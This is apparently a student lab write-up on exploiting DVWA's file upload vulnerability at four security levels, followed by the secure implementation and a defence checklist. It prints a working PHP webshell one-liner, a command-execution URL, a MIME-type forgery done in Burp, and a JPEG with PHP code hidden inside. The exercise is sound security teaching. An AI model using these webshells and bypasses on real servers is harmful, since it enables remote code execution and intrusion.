# File Upload Vulnerability Demonstration (DVWA)

## 1. Introduction

A file upload feature lets a user send a file to the server. If the server does not check the file properly, an attacker can upload a script instead of a normal file and get the server to run it. This gives the attacker code execution on the server, which is one of the most serious things that can happen to a web app.

This report shows the file upload vulnerability in DVWA at all four security levels (Low, Medium, High and Impossible). For each level I show how the upload is protected, how the protection can be bypassed, and what the correct fix is. At the end I list the full checklist of protections that a safe upload feature should have.

## 2. Setup

DVWA was already installed on Kali with Apache and MariaDB. The DVWA files sit directly in `/var/www/html`, so the application is reached at `http://127.0.0.1` with no extra folder in the path.

![DVWA files in /var/www/html](images/01-dvwa-files-var-www-html.png)

I logged in to DVWA at `http://127.0.0.1/login.php` using the default credentials admin / password.

![DVWA login page](images/02-dvwa-login.png)

The security level is set from the **DVWA Security** page. I started at **Low**.

![Security level set to Low](images/03-security-level-low.png)

---

## 3. Low Level

### Protection

None. The Low level accepts whatever file is sent and saves it, with no checks at all.

### Attack

First I made a small PHP webshell. This file runs any command passed to it in the URL:

```
echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php
```

Then I went to the **File Upload** page and uploaded `shell.php`. It was accepted and saved to `../../hackable/uploads/shell.php`.

![Low level, shell.php uploaded successfully](images/04-low-upload-success.png)

To prove the server actually runs the file, I opened it in the browser with a command attached:

```
http://127.0.0.1/hackable/uploads/shell.php?cmd=id
```

The page returned the output of the `id` command, which means my code ran on the server as the web server user.

![Low level, command execution showing uid=www-data](images/05-low-rce-id.png)

### Result

Full remote code execution. The server ran my uploaded PHP file.

### Fix

Do not accept arbitrary files. Check the file type on the server side and store uploads outside the web root so they cannot be run.

---

## 4. Medium Level

### Protection

The Medium level checks the file's MIME type (the `Content-Type` value) and only accepts `image/jpeg` or `image/png`. The problem is that this value is sent by the browser, so the attacker controls it and can lie about it.

I first switched the security level to **Medium**.

![Security level set to Medium](images/06-security-level-medium.png)

### Attack

I uploaded the same `shell.php` but intercepted the request with Burp Suite so I could change the `Content-Type` before it reached the server.

In the intercepted request, the uploaded file shows its real type, `application/x-php`:

![Burp request before edit, Content-Type application/x-php](images/07-medium-burp-before-xphp.png)

I changed that one line to `image/jpeg`, keeping the filename as `shell.php`, and forwarded the request:

![Burp request after edit, Content-Type image/jpeg](images/08-medium-burp-after-imagejpeg.png)

The server saw a type it trusted and accepted the file.

![Medium level, shell.php uploaded successfully](images/09-medium-upload-success.png)

I then triggered it the same way as before:

```
http://127.0.0.1/hackable/uploads/shell.php?cmd=id
```

![Medium level, command execution showing uid=www-data](images/10-medium-rce-id.png)

### Result

Full remote code execution again. The MIME check was bypassed by forging one header.

### Fix

Do not trust the `Content-Type` sent by the browser. Check the real content of the file on the server, and check the real file extension against an allow list.

---

## 5. High Level

### Protection

The High level is stronger. It checks two things:

1. The filename must end in `.jpg`, `.jpeg` or `.png`.
2. It uses `getimagesize()` to confirm the file actually contains real image data.

So a plain renamed PHP file will not pass. The trick is to build a file that is a real image on the outside but has PHP code hidden inside it.

I switched the security level to **High**.

![Security level set to High](images/11-security-level-high.png)

### Attack

I created a real JPEG and then added my PHP code to the end of it. The `convert` tool was missing at first, so I installed ImageMagick:

```
sudo apt install imagemagick -y
cd /tmp
convert -size 10x10 xc:white shell.jpg
echo '<?php system($_GET["cmd"]); ?>' >> shell.jpg
```

![Installing ImageMagick](images/12-high-install-imagemagick.png)

I checked the file. It is reported as a real JPEG, and the PHP code is sitting at the end of it:

![File check, JPEG image data with PHP at the end](images/13-high-file-check-jpeg.png)

On the **File Upload** page I selected `/tmp/shell.jpg`. The file picker was only showing `shell.php` at first because it was filtering by type and pointing at the wrong folder, so I typed the full path to pick the jpg.

![Selecting shell.jpg in the file picker](images/14-high-select-shelljpg.png)

The upload succeeded and saved to `../../hackable/uploads/shell.jpg`. This means the malicious file got past both the filename check and the `getimagesize()` check.

![High level, shell.jpg uploaded successfully](images/15-high-upload-success.png)

### Trying to run the file

A `.jpg` will not run as PHP on its own, so I used the **File Inclusion** page to try to execute it. The File Inclusion page gave a warning that it relies on old PHP behaviour that was removed after PHP 7.4, and this machine is running PHP 8.4.24.

![File Inclusion page, PHP 8.4.24 warning](images/16-high-fi-php84-warning.png)

With File Inclusion on High, the path to my jpg was blocked and I got "ERROR: File not found!", which is the File Inclusion defence doing its job:

```
http://127.0.0.1/vulnerabilities/fi/?page=../../hackable/uploads/shell.jpg&cmd=id
```

![File Inclusion on High, error file not found](images/17-high-fi-error-file-not-found.png)

I lowered the File Inclusion level so the path would be accepted, and tried again. This time the page loaded with no "file not found" error, but there was no command output anywhere on the page. PHP included the image and printed its raw bytes (shown by the broken image icon) but did not run the PHP code at the end.

![File Inclusion, included the jpg but no code execution](images/18-high-fi-no-execution.png)

### Result

The upload bypass worked. The malicious image was accepted and stored inside the web root. Code execution through File Inclusion did not work on this machine because the old PHP include behaviour it depends on is gone in PHP 8.4. On a PHP 7.4 setup this step would have given full code execution. So for this level the demonstrated result is that a malicious file was successfully planted in the web root.

### Fix

Checking the filename and `getimagesize()` is not enough, because a file can be a valid image and still contain code. The server should re-process the image (re-encode it), rename the file to something random, and store it outside the web root.

---

## 6. Impossible Level

### Protection

This level is the secure version. I did not attack it, I read its source code to show the correct defences. I set the level to **Impossible**.

![Security level set to Impossible](images/19-security-level-impossible.png)

I opened the source for the upload page. The code shows every protection a real upload feature should have.

![Impossible level source code](images/20-impossible-source.png)

The important parts of the code are:

- It checks an **Anti-CSRF token** so the request has to come from the real form.
- It reads the **real file extension** and only allows jpg or png.
- It uses **`getimagesize()`** to confirm the file is a real image.
- It **re-encodes the image** with `imagecreatefromjpeg()` and `imagejpeg()`, which strips out any PHP hidden inside. This is the part that defeats the High level trick.
- It **renames the file** to a random name with `bin2hex(random_bytes(16))`, so the attacker cannot guess or control the path.

With all of these in place, there is no way to upload and run code.

---

## 7. Summary

| Level | Protection | How it was beaten |
|-------|-----------|-------------------|
| Low | None | Uploaded a raw `.php` file and got command execution |
| Medium | Checks the MIME `Content-Type` header | Forged the header to `image/jpeg` in Burp and got command execution |
| High | Checks filename extension and `getimagesize()` | Hid PHP inside a real JPEG, file stored in web root (execution blocked only by PHP 8.4) |
| Impossible | Extension allow list, getimagesize, image re-encode, random rename, CSRF token | Nothing gets through |

---

## 8. Defence Checklist

A safe file upload feature should do all of the following:

1. Check the real file extension against an allow list, not the one the user claims.
2. Check the real file content, not the `Content-Type` sent by the browser.
3. Limit the file size.
4. Rename uploaded files to a random name so the path cannot be guessed.
5. Re-encode images so any hidden code is removed.
6. Store uploads outside the web root so they cannot be run directly.
7. Do not trust anything that comes from the client.

---

## 9. Conclusion

The demonstration showed how weak upload checks lead straight to code execution. At the Low and Medium levels I got full command execution on the server. At the High level I bypassed the image checks and planted a malicious file in the web root, with execution blocked only by the PHP version on the machine. The Impossible level showed what a correct upload looks like, where the extension check, content check, image re-encoding, random renaming and CSRF token together make the attack impossible. The main lesson is that the client can never be trusted, and all checking has to happen on the server.